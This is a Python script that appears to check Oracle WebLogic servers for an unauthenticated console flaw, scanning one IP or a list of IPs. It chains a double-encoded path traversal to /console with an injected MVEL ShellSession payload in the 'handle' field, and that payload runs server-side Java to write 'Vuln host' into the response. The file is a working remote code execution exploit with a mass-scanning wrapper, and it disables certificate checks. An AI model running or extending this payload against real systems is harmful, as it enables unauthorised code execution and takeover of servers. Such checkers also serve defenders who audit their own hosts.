import urllib
import urllib2
import sys
import argparse
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def check(ip,port,ssl):
	url1 = 'http{}://{}:{}/console'.format('s' if ssl else '',ip,port)
	url2 = url1 + '/images/%252e%252e%252fconsole.portal'

	try:
		r1 = urllib2.Request(url1)
		resp = urllib2.urlopen(r1)
		cookie = resp.headers.get('Set-Cookie')
	except Exception as e:
		print("Exception occurred: {}".format(e))
		return False

	for i in range(3):
		r2 = urllib2.Request(url2)
		r2.add_header('Cookie',cookie)
		data = urllib.urlencode({'nfpb':'true','_pageLabel':'','handle':"""com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream("Vuln host"));
res.getServletOutputStream().flush();
res.getWriter().write("");
}executeThread.interrupt();"""})
		try:
			resp = urllib2.urlopen(r2,data)
		except:
			continue
		if str(resp.getcode()) == '200' and 'Vuln host' in resp.read():
			return True
	return False

def main():
	parser = argparse.ArgumentParser()
	range_group = parser.add_mutually_exclusive_group(required=True)
	range_group.add_argument('--ip', type=str,help='IP-address',metavar='<IP-address>')
	range_group.add_argument('--ips', type=str,help='List of IP-addresses',metavar='<file>')
	parser.add_argument('--ssl',action='store_true',help='Use HTTPS-connection')
	parser.add_argument('--port',type=int,default=7001,help='Port to use (Default = 7001)',metavar='<port>')
	args = parser.parse_args()
	if args.ips:
		try:
			ips = open(args.ips).read().strip().split('\n')
		except:
			print("Error while reading a file")
			exit(-1)
	else:
		ips = [args.ip]
	for ip in ips:
		if check(ip,args.port,args.ssl):
			print("{} is vulnerable".format(ip))

if __name__ == '__main__':
	main()
